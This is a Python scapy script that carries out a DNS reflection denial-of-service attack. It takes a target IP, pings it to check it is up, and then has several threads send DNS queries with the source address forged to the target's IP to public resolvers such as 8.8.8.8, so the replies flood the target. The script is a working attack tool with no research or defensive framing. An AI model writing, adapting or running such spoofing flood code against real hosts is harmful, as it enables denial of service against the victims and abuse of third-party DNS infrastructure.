from scapy.all import *
from scapy.config import conf
import threading
import time
import argparse
import sys

conf.verb = 0

total_packets_sent = 0
lock = threading.Lock()
#DNS SERVER: 
# GOOGLE : 8.8.8.8
# FREEDNS : 37.235.1.174
# ALTERNATE DNS : 198.101.242.72
def parse_args():
    parser = argparse.ArgumentParser(description="-h for help")
    parser.add_argument('--t_ip', help="Target IP", required=True)
    parser.add_argument('--dns-port', default=53, help="Port from DNS server (port 53 is the common)")
    parser.add_argument('--qn', default='xtb.com', help="Canonical name of the domain for which we want to resolve the IP address (default 'xtb.com')")
    parser.add_argument('--dns-server', type=str, default='8.8.8.8', help="DNS Server to make DNSQUERY petitions")
    parser.add_argument('--packets', type=int, default=200, help="Number of packets to send (default: 200)")
    parser.add_argument('--max-threads', type=int, default=4 , help="Number of threads (default: 2)")
    parser.add_argument('--timeout', type=int, default=0, help="Time out between packets to send (default: 0)")
    return parser.parse_args()

def host_up():
    pkt = IP(dst=args.t_ip) / ICMP()
    res = sr1(pkt, timeout=4)
    if res:
        print(f"Host: {args.t_ip} is UP. Performing attack...\n")
        return True
    else: 
        print(f"Host: {args.t_ip} is DOWN. Try again...\n")
        sys.exit(1)

def create_packet(dns_server, t_ip, dns_port, qn, timeout): 
    pkt = IP(dst=dns_server, src=t_ip) / UDP(dport=int(dns_port), sport=RandShort()) / DNS(rd=1, qd=DNSQR(qname=qn, qtype="A"))
    time.sleep(timeout)
    send(pkt)

def perf_atack():
    global total_packets_sent
    for _ in range(args.packets // args.max_threads):
        create_packet(args.dns_server, args.t_ip, args.dns_port, args.qn, args.timeout)
        with lock:
            total_packets_sent += 1

def main():
    global args
    args = parse_args()

    if host_up():
        threads = []
        try:
            for _ in range(args.max_threads):
                t = threading.Thread(target=perf_atack)
                threads.append(t)
                t.start()
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print("Attack interrupted by user.,\n")
            sys.exit(0)

        print(f"Total packets sent: {total_packets_sent} \n")

if __name__ == "__main__":
    main()
